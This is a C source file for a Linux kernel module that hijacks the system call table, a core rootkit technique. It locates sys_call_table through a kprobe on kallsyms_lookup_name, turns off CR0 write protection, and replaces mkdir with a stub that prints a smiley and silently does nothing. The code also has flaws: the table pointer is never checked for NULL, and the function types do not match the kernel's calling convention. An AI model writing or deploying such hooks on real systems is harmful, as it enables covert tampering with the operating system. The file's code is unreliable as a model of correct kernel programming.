#include <asm/unistd.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>

#include "include/sys_calls.h"

typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs *);
typedef asmlinkage long (*mkdir_t)(const char *, mode_t);

static mkdir_t original_mkdir;

static unsigned long *syscall_table = NULL;

static asmlinkage long hacked_mkdir(const char *path, mode_t mode) {
	printk(KERN_INFO ":-)\n");

	return 0;
}

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

static unsigned long *get_syscall_table(void) {
	unsigned long *sct = NULL;
	kallsyms_lookup_name_t lookup_name = NULL;
	struct kprobe kp = {
		.symbol_name = "kallsyms_lookup_name"
	};

	if (register_kprobe(&kp) < 0) {
		printk("Couldn't register kprobe\n");
		return NULL;
	}

	unregister_kprobe(&kp);
	
	lookup_name = (kallsyms_lookup_name_t)kp.addr;
	sct = (unsigned long *)lookup_name("sys_call_table");
	printk("sys_call_table: %px\n", sct);
	return sct;
}

static inline void _write_cr0(unsigned long val) {
	__asm__ __volatile__("mov %0, %%cr0": "+r"(val));
}

static void disable_write_protection(void) {
	unsigned long val = read_cr0();
	val &= (~0x10000);
	_write_cr0(val);
}

static void enable_write_protection(void) {
	unsigned long val = read_cr0();
	val |= 0x10000;
	_write_cr0(val);
}

int sys_calls_init(void) {

	disable_write_protection();
	syscall_table = get_syscall_table();
	original_mkdir = (mkdir_t)syscall_table[__NR_mkdir];
	syscall_table[__NR_mkdir] = (sys_call_ptr_t)hacked_mkdir;

	enable_write_protection();

	return 0;
}

void sys_calls_cleanup(void) {
	disable_write_protection();

	syscall_table[__NR_mkdir] = (sys_call_ptr_t)original_mkdir;

	enable_write_protection();
}

